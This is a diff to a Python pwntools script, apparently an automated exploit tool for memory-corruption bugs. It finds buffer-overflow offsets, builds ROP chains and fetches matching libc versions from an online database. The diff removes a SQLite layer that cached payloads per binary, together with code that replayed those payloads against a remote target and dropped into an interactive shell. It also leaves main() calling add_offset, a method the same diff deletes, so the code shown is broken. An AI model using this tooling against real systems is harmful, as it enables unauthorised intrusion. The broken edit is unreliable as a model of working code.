@@ -27,50 +27,8 @@ log = logging.getLogger(__name__)
 
 #is_printable = True
 
-class Database():
-	def __init__(self, binary, aslr):
-		self.md5sum = pwnlib.util.hashes.md5filehex(binary)
-		self.aslr = aslr
-		self.db = sqlite3.connect('./database/database')
-		self.cursor = self.db.cursor()
-		self.create_database()
-		self.cursor.execute("SELECT md5sum FROM binaryInfo")
-		data = self.cursor.fetchall()
-		self.pwn_state = any(self.md5sum in data for data in data)
 
-	def create_database(self):
-		self.cursor.execute("DROP TABLE IF EXISTS binaryInfo")
-		self.cursor.execute("DROP TABLE IF EXISTS payload")
-		self.cursor.execute('CREATE TABLE IF NOT EXISTS binaryInfo (md5sum varchar(50) PRIMARY KEY, offset int, libc varchar(100), aslr int)')
-		self.cursor.execute('CREATE TABLE IF NOT EXISTS payload (md5sum varchar(50), payload1 varchar(1000), payload2 varchar(1000), FOREIGN KEY (md5sum) REFERENCES binaryInfo(md5sum) ON DELETE SET null)')
-	
-	def add_basics(self):
-		request = "INSERT INTO binaryInfo (md5sum, aslr) VALUES (?,?)"
-		self.cursor.execute(request, (self.md5sum, self.aslr))
-		self.db.commit()
-
-	def add_offset(self, offset):
-		self.cursor.execute('UPDATE binaryInfo SET offset = ? WHERE md5sum = ?',(offset, self.md5sum))
-		self.db.commit()
-
-	def add_libc(self, libc):
-		self.cursor.execute('UPDATE binaryInfo SET libc = ? WHERE md5sum = ?',(libc, self.md5sum))
-		self.db.commit()
-
-	def prep_md5sum(self):
-		request = "INSERT INTO payload (md5sum) VALUES (?)"
-		self.cursor.execute(request, (self.md5sum,))
-		self.db.commit()
-
-	def add_p1(self, p1):
-		self.cursor.execute("UPDATE payload SET payload1 = ? WHERE md5sum = ?", (p1, self.md5sum))
-		self.db.commit()
-
-	def add_p2(self, p2):
-		self.cursor.execute("UPDATE payload SET payload2 = ? WHERE md5sum = ?", (p2, self.md5sum))
-		self.db.commit()
-
-class Exploit(Database):
+class Exploit():
 	def __init__(self, binary, arch="amd64", is_printable=False, ip=None, port=None):
 		self.ip = ip 
 		self.port = port
@@ -81,10 +39,6 @@ class Exploit(Database):
 		self.rop = ROP(self.elf)
 		self.url_find_libc = "https://libc.blukat.me/?q="
 		self.url_download_libc = "https://libc.blukat.me/d/"
-		Database.__init__(self, binary, self.elf.aslr)
-		if not self.pwn_state:
-			self.add_basics()
-			self.prep_md5sum()
 		os.path.join(os.getcwd(), "libc")
 		if self.ip is not None and self.port is not None:
 			try:
@@ -245,22 +199,6 @@ class Exploit(Database):
 		return os.path.join(os.getcwd(), path)
 
 	def main(self):
-		if self.pwn_state and self.elf.aslr != True:
-			self.cursor.execute("SELECT payload1, payload2 FROM payload WHERE md5sum = ?",(self.md5sum,))
-			data = self.cursor.fetchall()
-			print(data)
-			print(self.p.recvline())
-			print(self.p.recvline())
-			self.p.sendline(data[0][0])
-			print(self.p.recvline())
-			print(self.p.recvline())
-			print(self.p.recvline())
-			print(self.p.recvline())
-			print(self.p.recvline())
-			self.p.sendline(data[0][1])
-			self.p.interactive()
-			exit(0)
-
 		overflow_result = self.checkOverflow(self.binary_name)
 		offset = overflow_result.get("offset")
 		self.add_offset(offset)
